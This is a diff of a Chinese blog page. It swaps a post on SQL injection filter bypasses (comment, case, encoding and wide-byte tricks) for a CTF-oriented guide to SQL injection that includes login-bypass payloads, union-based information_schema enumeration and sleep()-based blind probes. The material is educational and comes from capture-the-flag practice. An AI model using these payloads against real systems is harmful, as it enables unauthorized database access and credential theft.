@@ -37,7 +37,7 @@
 
 	<article>
 	
-		<h1><a href="/2019/03/16/sql7/">SQL注入中的绕过</a></h1>
+		<h1><a href="/2019/03/16/sql0/">CTF中的SQL注入的思路总结</a></h1>
 	
 	<div class="article__infos">
 		<span class="article__date">2019-03-16</span><br>
@@ -56,71 +56,52 @@
 	
 
 	
-		<p>###一.对于关键字的绕过</p>
+		<h4 id="1-拿到题目之后一般是一个登陆框-大概率盲注或者是报错-写脚本跑"><a href="#1-拿到题目之后一般是一个登陆框-大概率盲注或者是报错-写脚本跑" class="headerlink" title="1.拿到题目之后一般是一个登陆框(大概率盲注或者是报错,写脚本跑):"></a>1.拿到题目之后一般是一个登陆框(大概率盲注或者是报错,写脚本跑):</h4><p><figure class="figure"><img src="https://i.loli.net/2018/09/11/5b979e5c0ee9b.png" alt="1.png"><figcaption class="figure__caption">1.png</figcaption></figure></p>
+<p>尝试输入用户名(admin)和密码(随意)查看其返回结果这里一般又分为两种:</p>
 <ol>
-<li>注释符绕过:<code>uni/**/on se/**/lect</code></li>
-<li>大小写绕过:<code>UniOn SeleCt</code></li>
-<li>双关键字绕过:<code>ununionion seselectlect</code></li>
-<li>&lt;&gt;绕过:<code>unio&lt;&gt;n sel&lt;&gt;ect</code>(可能是有些网站为了防止xss注入,所以过滤了&lt;&gt;,参照i春秋sql)</li>
-<li>对于and,or的绕过其实还可以尝试一下&amp;&amp;,||,<a href="https://blog.csdn.net/zpy1998zpy/article/details/80667775" target="_blank" rel="noopener">异或注入</a></li>
+<li>有返回是密码错误还是用户名错误</li>
+<li>只是单一的返回登陆失败</li>
 </ol>
-<p><strong>这里需要注意一点就是or被过滤的时候order,information中的or也被过滤了</strong></p>
-<hr>
-<p>###二.对特殊字符的绕过</p>
+<p><strong>对于第一种情况就可以直接尝试在<code>username</code>之后输入payload的了</strong></p>
 <ul>
-<li><p>对空格的绕过:<br></p>
-<pre>两个空格代替一个,用tab键代替空格
-`/**/ %20 %09 %0a` 
-利用空格绕过:很多关键字都可以写成带括号的形式select(),or()
-特殊函数中的空格绕过:ascii(mid(xxfrom(1))) ascii(substr(xxfrom(1)))</pre>
+<li>判断注入点</li>
+<li>按照执行效果判断sql注入类型</li>
+<li>利用字典跑一下被过滤的特殊符号和关键字(判断语句一般使用regexp或length(),and或者异或,再或者就是直接输入)<blockquote>
+<p>payload <code>and length(&#39;关键字&#39;)&gt;0</code></p>
+<pre><code>`^length(&apos;关键字&apos;)&gt;0`
+</code></pre></blockquote>
 </li>
-<li><p>对单引号的绕过:<br><br><code>宽字节 %bf%27 %df%27 %aa%27(争对字符集为GBK时使用</code><br><br><code>十六进制绕过(针对需要输入表名的时候 &#39;user&#39;=&gt;0x7573657273)</code><br></p>
-</li>
-<li><p>对逗号的绕过:</p>
-  <pre>
-  substr(x,1,1),mid(x,1,1)=>substr(x from 1 for 1) mid(x from 1 for 1)
-  limit 0,1=> limit 0 offset 1
-  join(本身是用来连接两个表单的,所以join一定是要放在from后面放表单的位置):
-  union select 1,2 =>
-  union select * from (select 1)a join (select 2)b
-  select case when (条件) then (代码1) else (代码2) end 可以对应上if(条件,代码1,代码2)
-  if(substring((select user()) from 1 for 1)='e',sleep(5),1)
-  可以变为
-  select case when substring((select user()) from 1 for 1)='e' then sleep(5) else 1 end
-   </pre>
-</li>
-<li><p>等号的绕过:</p>
-<pre>
-  利用<>(即不等于号)绕过
-  利用like绕过
-  利用greatest()绕过(greatest(a,b)返回较大的那个数)
-  ?id=' or 1 like 1
-  ?id=' or 1 <> 1
-  ?id=' union select greatest(substr((select user()),1,1),95)
-</pre>
-
-</li>
+<li>最后利用information_schema爆出库名,表名,字段名以及flag</li>
 </ul>
-<hr>
-<p>###三.其他类型的绕过</p>
+<p><strong>对于第二种情况就稍微要复杂一些了</strong></p>
 <ul>
-<li><p>编码绕过:</p>
-<pre>
-  * 双重url编码:?id=1%252f%252aUNION%252f%252aSELECT%252f%252a1,2,password%252f%252aFROM%252f%252a/Users--+
-  * unicode编码:'=> %u0037 %u02b9
-                空格=> %u0020 %uff00
-                左括号=> %u0028 %uff08
-                  右括号=> %u0029 %uff09
-</pre>    
-</li>
-<li><p>相同字符的绕过:<br><br>题目中有是可能会出现一种情况:</p>
-<blockquote>
-<p>它不允许出现某个字符串,但是在数据库中又确实存在这个字符串,再加之mysql与php的编码字符集不相同,便可以利用相似的字符将其绕过</p>
-</blockquote>
-</li>
+<li>可以用burp抓个包,查看一下数据包中是否存在着一些提示内容</li>
+<li>尝试一些万能的登陆密码:假设sql语句是:<br><code>select * from user where username=’$username’ and password=’$password’</code><br>而我们我发送的数据包中是 <code>username= &amp;password=</code>                            </li>
 </ul>
-<p><figure class="figure"><img src="https://i.loli.net/2018/09/13/5b9a54128b0b7.png" alt="1.png"><figcaption class="figure__caption">1.png</figcaption></figure></p>
-<p>可以参考的题目<a href="https://www.ichunqiu.com/battalion" target="_blank" rel="noopener">百度杯十月场look</a></p>
+<ol>
+<li><p><code>username=reborn&#39;=&#39;&amp;password=reborn&#39;=&#39;</code> =&gt; <code>select * from user where username=&#39;reborn&#39;=&#39; and password=&#39;reborn&#39;=&#39;</code>=&gt;<code>select * from user where 1 and 1</code></p>
+</li>
+<li><p><code>username=&#39; or 1=1 %23&amp;password=123456</code></p>
+</li>
+<li><p><code>username=admicsfn&#39; union select &#39;25d55ad283aa400af464c76d713c07ad&#39;%23&amp;password=12345678</code>利用不存在的用户再去构造一个密码来进行登陆</p>
+</li>
+</ol>
+<ul>
+<li>查看一下(利用字典)试一试哪一个特殊符号会报错之类的,如果有报错,则考虑报错注入</li>
+<li>如果报错的是一些不常见的字符串,那可能就涉及了某些漏洞,比如%报错,就可能是sprintf格式化字符串漏洞</li>
+<li>题外话:平时多浏览一些安全网站,去找新出现的漏洞,及时去做一些漏洞复现,与时俱进</li>
+</ul>
+<h4 id="2-题目是GET注入-大概率是回显注入"><a href="#2-题目是GET注入-大概率是回显注入" class="headerlink" title="2.题目是GET注入(大概率是回显注入)"></a>2.题目是GET注入(大概率是回显注入)</h4><ol>
+<li>判断注入点</li>
+<li>利用order by判断字段数</li>
+<li><code>union select 1,2,3,...%23</code>判断具体哪个字段存在回显</li>
+<li>利用字典跑一下被过滤的特殊符号和关键字(判断语句一般使用length(),and或者异或,再或者就是直接输入)</li>
+<li>最后利用information_schema爆出库名,表名,字段名以及flag</li>
+</ol>
+<ul>
+<li>如果回显的内容一直不存在变化那就需要考虑盲注了</li>
+</ul>
+<h4 id="3-页面直接返回注入结果-insert等其他类型的注入-考虑时间盲注"><a href="#3-页面直接返回注入结果-insert等其他类型的注入-考虑时间盲注" class="headerlink" title="3.页面直接返回注入结果(insert等其他类型的注入,考虑时间盲注)"></a>3.页面直接返回注入结果(insert等其他类型的注入,考虑时间盲注)</h4><p>可以使用<code>&#39; and sleep(5)=&#39;1&#39;=&#39;1</code>或<code>&#39; and sleep(5)=&#39;1&#39;=&#39;1&#39; %23</code>来判断sleep()能否执行    </p>
 
 	
 
